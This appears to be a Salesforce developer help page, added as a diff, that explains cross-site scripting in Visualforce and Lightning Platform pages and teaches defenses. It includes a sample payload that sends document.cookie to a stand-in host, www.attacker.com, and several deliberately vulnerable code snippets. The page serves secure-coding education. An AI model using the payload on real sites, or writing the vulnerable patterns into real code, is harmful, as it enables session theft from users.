@@ -1,0 +1,108 @@
+<a name="pages_security_tips_xss"><!-- --></a><h1 class="helpHead1">Cross Site Scripting (XSS)</h1><div class="body">
+    <div class="section">
+      <p class="p">Cross-site scripting (XSS) attacks are where malicious HTML or client-side scripting is
+        provided to a web application. The web application includes malicious scripting in a
+        response to a user who unknowingly becomes the victim of the attack. The attacker uses the
+        web application as an intermediary in the attack, taking advantage of the victim's trust for
+        the web application. Most applications that display dynamic web pages without properly
+        validating the data are likely to be vulnerable. Attacks against the website are especially
+        easy if input from one user is shown to another user. Some obvious possibilities include
+        bulletin board or user comment-style websites, news, or email archives.</p>
+
+      <div class="p">For example, assume this script is included in a Lightning Platform page using a script
+        component, an <samp class="codeph nolang">on*</samp> event, or a Visualforce
+        page.<div class="codeSection html"><pre class="codeblock brush:html"><span class="tag">&lt;script</span>&gt;<span class="keyword">var</span> foo = <span class="string">'{!$CurrentPage.parameters.userparam}'</span>;<span class="tag">&lt;/script</span>&gt;</pre></div>
+</div>
+
+      <div class="p">This script block inserts the value of the user-supplied <samp class="codeph nolang">userparam</samp> onto the page. The attacker can then enter this value for <samp class="codeph nolang">userparam</samp>.<div class="codeSection nolang"><pre class="codeblock brush:plain">1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2</pre></div>
+</div>
+
+      <p class="p">In this case, all cookies for the current page are sent to
+          <span class="ph filepath">www.attacker.com</span> as the query string in the request to the <samp class="codeph nolang">cookie.cgi</samp> script. At this point, the attacker has the
+        victim's session cookie and can connect to the web application as if they were the victim. </p>
+
+      <p class="p">The attacker can post a malicious script using a website or email. Web application users
+        not only see the attacker's input, but their browser can execute the attacker's script in a
+        trusted context. With this ability, the attacker can perform a wide variety of attacks
+        against the victim. These attacks range from simple actions, such as opening and closing
+        windows, to more malicious attacks, such as stealing data or session cookies, which allow an
+        attacker full access to the victim's session.</p>
+
+      <p class="p">For more information on this type of attack:</p>
+
+      <ul class="ul bulletList">
+        <li class="li"><a class="xref" href="http://www.owasp.org/index.php/Cross_Site_Scripting" target="_blank" title="HTML (New Window)">http://www.owasp.org/index.php/Cross_Site_Scripting</a></li>
+
+        <li class="li"><a class="xref" href="http://www.cgisecurity.com/xss-faq.html" target="_blank" title="HTML (New Window)">http://www.cgisecurity.com/xss-faq.html</a></li>
+
+        <li class="li"><a class="xref" href="http://www.owasp.org/index.php/Testing_for_Cross_site_scripting" target="_blank" title="HTML (New Window)">http://www.owasp.org/index.php/Testing_for_Cross_site_scripting</a></li>
+
+        <li class="li"><a class="xref" href="http://www.google.com/search?q=cross-site+scripting" target="_blank" title="HTML (New Window)">http://www.google.com/search?q=cross-site+scripting</a></li>
+
+      </ul>
+
+      <p class="p">Within the Lightning Platform, several anti-XSS defenses are in place. For example,
+        Salesforce has filters that screen out harmful characters in most output methods. For the
+        developer using standard classes and output methods, the threats of XSS flaws are largely
+        mitigated. But the creative developer can still find ways to intentionally or accidentally
+        bypass the default controls.</p>
+
+    </div>
+
+    <div class="section">
+<h2 class="helpHead2">Existing Protection</h2>
+
+      
+      <div class="p">All standard Visualforce components, which start with <samp class="codeph apex_page"><span class="tag">&lt;apex</span>&gt;</samp>, have anti-XSS filters in place to screen out harmful characters. For
+        example, this code is normally vulnerable to an XSS attack because it takes user-supplied
+        input and outputs it directly back to the user, but the <samp class="codeph apex_page"><span class="tag">&lt;apex:outputText</span>&gt;</samp> tag is XSS-safe. All characters that appear to be HTML tags
+        are converted to their literal form. For example, the &lt; character is converted to <samp class="codeph nolang">&amp;lt;</samp> so that a literal &lt; appears on the user's
+        screen.<div class="codeSection apex_page"><pre class="codeblock brush:VisualForce"><span class="tag">&lt;apex:outputText</span>&gt; 
+    <span class="formula">{!$CurrentPage.parameters.userInput}</span> 
+<span class="tag">&lt;/apex:outputText</span>&gt;</pre></div>
+</div>
+
+    </div>
+
+    <div class="section">
+<h2 class="helpHead2">Disabling Escape on Visualforce Tags</h2>
+
+      
+      <div class="p" id="escape_intro">
+<a name="escape_intro"><!-- --></a>By default, nearly all Visualforce tags escape the XSS-vulnerable
+        characters. You can disable this behavior by setting the optional attribute <samp class="codeph apex_page">escape=<span class="string">"false"</span></samp>. For example, this output is vulnerable to
+        XSS
+        attacks.<div class="codeSection apex_page"><pre class="codeblock brush:VisualForce"><span class="tag">&lt;apex:outputText</span><span class="attribute"> escape=</span><span class="string">"false"</span><span class="attribute"> value=</span><span class="string">"{!$CurrentPage.parameters.userInput}"</span> /&gt;</pre></div>
+</div>
+
+    </div>
+
+    <div class="section">
+<h2 class="helpHead2">Programming Items Not Protected from XSS</h2>
+
+      
+      <p class="p">Custom Javascript code and code within <samp class="codeph apex_code">&lt;apex:includeScript&gt;</samp> components don’t have built-in XSS protections. These
+        items allow the developer to customize the page with script commands. It doesn’t makes sense
+        to include anti-XSS filters on commands that are intentionally added to a page.</p>
+
+      <p class="p">If you write your own JavaScript, the Lightning Platform has no way to protect you. For
+        example, this code is vulnerable to XSS if used in JavaScript.</p>
+
+      <div class="codeSection html"><pre class="codeblock brush:html"><span class="tag">&lt;script</span>&gt; 
+    <span class="keyword">var</span> foo = location.search; 
+    document.write(foo); 
+<span class="tag">&lt;/script</span>&gt;</pre></div>
+
+      <p class="p">With the <samp class="codeph apex_page"><span class="tag">&lt;apex:includeScript</span>&gt;</samp> Visualforce
+        component, you can include a custom script on a page. Make sure to validate that the content
+        is safe and includes no user-supplied data. For example, this snippet is vulnerable because
+        it includes user-supplied input as the value of the script text. The value provided by the
+        tag is a URL to the JavaScript to include. If an attacker can supply arbitrary data to this
+        parameter as in the example, they’re able to direct the victim to include any JavaScript
+        file from any other website.</p>
+
+      <div class="codeSection apex_page"><pre class="codeblock brush:VisualForce"><span class="tag">&lt;apex:includeScript</span><span class="attribute"> value=</span><span class="string">"{!$CurrentPage.parameters.userInput}"</span> /&gt;</pre></div>
+
+    </div>
+
+  </div><div id="sfdc:seealso" class="related-links"></div>
